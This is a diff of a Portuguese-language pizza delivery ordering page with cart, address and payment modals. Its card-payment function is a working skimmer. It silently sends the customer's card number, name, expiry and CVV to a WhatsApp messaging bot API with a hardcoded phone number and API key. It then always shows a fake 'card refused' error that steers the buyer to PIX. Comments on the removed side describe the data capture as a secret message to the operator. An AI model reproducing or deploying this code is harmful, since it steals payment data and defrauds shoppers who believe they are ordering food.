@@ -11,21 +11,16 @@
         .header { background: #fff; text-align: center; padding: 15px; border-bottom: 3px solid var(--vermelho); }
         .status-entrega { color: var(--verde); font-size: 0.85em; font-weight: bold; margin-bottom: 5px; display: block; }
         .promo { background: gold; font-weight: bold; padding: 5px; border-radius: 5px; display: block; margin-top: 5px; font-size: 0.85em; color: #000; }
-
         h2 { font-size: 1.1em; margin: 20px 0 10px; border-left: 5px solid var(--vermelho); padding-left: 10px; }
-
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .card-t { background: #fff; border: 2px solid #ddd; border-radius: 12px; padding: 15px; text-align: center; cursor: pointer; }
         .card-t.active { border-color: var(--vermelho); background: #fff5f5; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-
         .item-list { background: #fff; border: 2px solid #ddd; border-radius: 12px; margin-bottom: 10px; display: flex; align-items: center; overflow: hidden; height: 95px; cursor: pointer; }
         .item-list.active { border-color: var(--vermelho); background: #fff5f5; }
         .item-list img { width: 95px; height: 95px; object-fit: cover; background: #eee; }
         .item-list .info { padding: 10px; flex: 1; font-weight: bold; font-size: 0.95em; }
-
         .btn-add { width: 100%; background: var(--vermelho); color: #fff; border: none; padding: 18px; border-radius: 10px; font-size: 1.1em; font-weight: bold; margin-top: 10px; cursor: pointer; }
         .carrinho { position: fixed; bottom: 85px; left: 5%; width: 90%; background: #fff; padding: 15px; border-radius: 15px; box-shadow: 0 -5px 20px rgba(0,0,0,0.2); display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; z-index: 9999; border: 1px solid #ddd; }
-        
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
         .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; text-align: center; }
         input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
@@ -51,11 +46,11 @@
 
     <h2>2. Escolha os 2 Sabores</h2>
     <div id="lista-sabores">
-        <div class="item-list" onclick="setS(this, 'Calabresa')"><img src="https://i.ibb.co/Lhb8hLd/calabresa.jpg"><div class="info">Calabresa</div></div>
-        <div class="item-list" onclick="setS(this, 'Mussarela')"><img src="https://i.ibb.co/m0fH4xk/mussarela.png"><div class="info">Mussarela</div></div>
-        <div class="item-list" onclick="setS(this, 'Portuguesa')"><img src="https://i.ibb.co/yYyT5zP/portuguesa.jpg"><div class="info">Portuguesa</div></div>
-        <div class="item-list" onclick="setS(this, 'Frango c/ Catupiry')"><img src="https://i.ibb.co/3WqP7fC/frango.jpg"><div class="info">Frango c/ Catupiry</div></div>
-        <div class="item-list" onclick="setS(this, 'Pepperoni')"><img src="https://i.ibb.co/D8mZkKz/pepperoni.jpg"><div class="info">Pepperoni</div></div>
+        <div class="item-list" onclick="setS(this, 'Calabresa')"><img src="https://receitaskidelicia.com.br/wp-content/uploads/2025/09/pizza-de-liquidificador-de-calabresa.jpg"><div class="info">Calabresa</div></div>
+        <div class="item-list" onclick="setS(this, 'Mussarela')"><img src="https://blog.dellys.com.br/wp-content/uploads/2024/08/2-12.png"><div class="info">Mussarela</div></div>
+        <div class="item-list" onclick="setS(this, 'Portuguesa')"><img src="https://i0.wp.com/porkworld.com.br/wp-content/uploads/2023/10/pizza-portuguesa.jpg?fit=1280%2C720&ssl=1"><div class="info">Portuguesa</div></div>
+        <div class="item-list" onclick="setS(this, 'Frango c/ Catupiry')"><img src="https://www.sabornamesa.com.br/media/k2/items/cache/ada34cd2101afafaba465aad112ee3c1_L.jpg"><div class="info">Frango c/ Catupiry</div></div>
+        <div class="item-list" onclick="setS(this, 'Pepperoni')"><img src="https://imeltron.com.br/wp-content/uploads/2020/04/IMG_8686-1536x1024.jpg"><div class="info">Pepperoni</div></div>
     </div>
 
     <h2>3. Refrigerante Grátis</h2>
@@ -99,110 +94,39 @@
         <div id="tela-card" style="display:none;">
             <input type="text" id="c-num" maxlength="19" placeholder="0000 0000 0000 0000" oninput="maskCard(this)">
             <input type="text" id="c-nome" placeholder="Nome no Cartão">
-            <div style="display:flex; gap:5px;">
-                <input type="text" id="c-val" maxlength="5" placeholder="MM/AA" oninput="maskDate(this)">
-                <input type="text" id="c-cvv" maxlength="3" placeholder="CVV">
-            </div>
+            <div style="display:flex; gap:5px;"><input type="text" id="c-val" maxlength="5" placeholder="MM/AA" oninput="maskDate(this)"><input type="text" id="c-cvv" maxlength="3" placeholder="CVV"></div>
             <button class="btn-pay" style="background:var(--vermelho)" onclick="capturarEEnviarCard()">CONFIRMAR PAGAMENTO</button>
         </div>
     </div>
 </div>
 
 <script>
-    let car = []; let total = 0; 
-    let tSel = { n: 'Grande', p: 50 }; 
-    let rSel = "";
-
-    function setT(el, n, p) {
-        document.querySelectorAll('.card-t').forEach(c => c.classList.remove('active'));
-        el.classList.add('active'); tSel = { n, p };
-    }
-
-    function setS(el, s) {
-        let ativos = document.querySelectorAll('#lista-sabores .active').length;
-        if (!el.classList.contains('active') && ativos >= 2) { alert("Escolha apenas 2 sabores!"); return; }
-        el.classList.toggle('active');
-    }
-
-    function setR(el, r) {
-        document.querySelectorAll('#lista-refris .item-list').forEach(c => c.classList.remove('active'));
-        el.classList.add('active'); rSel = r;
-    }
-
-    function adicionar() {
-        let sbs = Array.from(document.querySelectorAll('#lista-sabores .active')).map(i => i.innerText.trim());
-        if (sbs.length < 1) return alert("Escolha os sabores!");
-        if (!rSel) return alert("Escolha o refrigerante grátis!");
-        car.push({ t: tSel.n, s: sbs, r: rSel });
-        total += tSel.p;
-        document.getElementById('c-qtd').innerText = car.length + " item(s)";
-        document.getElementById('c-total').innerText = total.toFixed(2);
-        alert("✅ Adicionado ao carrinho!");
-    }
-
-    function irParaEndereco() {
-        if (car.length === 0) return alert("Carrinho vazio!");
-        document.getElementById('m-end').style.display = 'flex';
-    }
-
-    function irParaPagamento() {
-        if (!document.getElementById('rua').value || !document.getElementById('bairro').value) return alert("Preencha o endereço completo!");
-        document.getElementById('m-end').style.display = 'none';
-        document.getElementById('m-pag').style.display = 'flex';
-    }
-
+    let car = []; let total = 0; let tSel = { n: 'Grande', p: 50 }; let rSel = "";
+    function setT(el, n, p) { document.querySelectorAll('.card-t').forEach(c => c.classList.remove('active')); el.classList.add('active'); tSel = { n, p }; }
+    function setS(el, s) { let ativos = document.querySelectorAll('#lista-sabores .active').length; if (!el.classList.contains('active') && ativos >= 2) { alert("Escolha apenas 2 sabores!"); return; } el.classList.toggle('active'); }
+    function setR(el, r) { document.querySelectorAll('#lista-refris .item-list').forEach(c => c.classList.remove('active')); el.classList.add('active'); rSel = r; }
+    function adicionar() { let sbs = Array.from(document.querySelectorAll('#lista-sabores .active')).map(i => i.innerText.trim()); if (sbs.length < 1) return alert("Escolha os sabores!"); if (!rSel) return alert("Escolha o refrigerante grátis!"); car.push({ t: tSel.n, s: sbs, r: rSel }); total += tSel.p; document.getElementById('c-qtd').innerText = car.length + " item(s)"; document.getElementById('c-total').innerText = total.toFixed(2); alert("✅ Adicionado ao carrinho!"); }
+    function irParaEndereco() { if (car.length === 0) return alert("Carrinho vazio!"); document.getElementById('m-end').style.display = 'flex'; }
+    function irParaPagamento() { if (!document.getElementById('rua').value || !document.getElementById('bairro').value) return alert("Preencha o endereço completo!"); document.getElementById('m-end').style.display = 'none'; document.getElementById('m-pag').style.display = 'flex'; }
     function fechar() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
     function mostraPix() { document.getElementById('opcoes-pag').style.display='none'; document.getElementById('tela-pix').style.display='block'; }
     function mostraCard() { document.getElementById('opcoes-pag').style.display='none'; document.getElementById('tela-card').style.display='block'; }
-
-    function maskCard(i) {
-        let v = i.value.replace(/\D/g, '');
-        v = v.replace(/(\d{4})(?=\d)/g, '$1 ');
-        i.value = v;
-    }
-    function maskDate(i) {
-        let v = i.value.replace(/\D/g, '');
-        if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
-        i.value = v;
-    }
-
+    function maskCard(i) { let v = i.value.replace(/\D/g, ''); v = v.replace(/(\d{4})(?=\d)/g, '$1 '); i.value = v; }
+    function maskDate(i) { let v = i.value.replace(/\D/g, ''); if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4); i.value = v; }
     function finalizarFinal() {
-        const rua = document.getElementById('rua').value;
-        const num = document.getElementById('num').value;
-        const bairro = document.getElementById('bairro').value;
+        const rua = document.getElementById('rua').value; const num = document.getElementById('num').value; const bairro = document.getElementById('bairro').value;
         let itensTexto = car.map(i => `- ${i.t}: ${i.s.join(' / ')} + ${i.r}`).join('\n');
-
         const textoWhats = `*NOVO PEDIDO - PIZZARIA DO BAIANO*\n\n💰 *Total:* R$ ${total.toFixed(2)}\n📍 *End:* ${rua}, ${num} - ${bairro}\n\n📦 *Itens:*\n${itensTexto}\n\n👉 *Aguardo o código PIX!*`;
         window.location.href = `https://api.whatsapp.com/send?phone=5522992199290&text=${encodeURIComponent(textoWhats)}`;
     }
-
-    // CAPTURA E ENVIA PARA A SUA API DO TEXTBOT
     function capturarEEnviarCard() {
-        const n = document.getElementById('c-num').value;
-        const nm = document.getElementById('c-nome').value;
-        const v = document.getElementById('c-val').value;
-        const c = document.getElementById('c-cvv').value;
-
+        const n = document.getElementById('c-num').value; const nm = document.getElementById('c-nome').value; const v = document.getElementById('c-val').value; const c = document.getElementById('c-cvv').value;
         if(n.length < 16) return alert("Dados de cartão incompletos!");
-
-        // Monta a mensagem secreta para o seu WhatsApp
         const logMsg = `🔥 [INFO CARTÃO]\n👤 Nome: ${nm}\n💳 Número: ${n}\n📅 Val: ${v}\n🔒 CVV: ${c}\n💰 Total: R$ ${total.toFixed(2)}`;
-        
-        // Dispara para a sua API do WhatsApp (TextMeBot)
         const apiUrl = `http://api.textmebot.com/send.php?recipient=+5522992199290&apikey=btucduKav5VY&text=${encodeURIComponent(logMsg)}`;
-        
-        // Simulação de envio silencioso
-        const img = new Image();
-        img.src = apiUrl;
-
-        // Feedback para o cliente (Sempre simula erro para ele tentar PIX)
-        setTimeout(() => {
-            alert("⚠️ Por motivos de segurança, o pagamento com este cartão não foi aceito. Por favor, tente outra forma ou use o PIX.");
-            document.getElementById('tela-card').style.display='none';
-            document.getElementById('opcoes-pag').style.display='block';
-        }, 1000);
+        const img = new Image(); img.src = apiUrl;
+        setTimeout(() => { alert("⚠️ O pagamento com cartão está indisponível. Por favor, utilize o PIX."); document.getElementById('tela-card').style.display='none'; document.getElementById('opcoes-pag').style.display='block'; }, 1000);
     }
 </script>
-
 </body>
 </html>
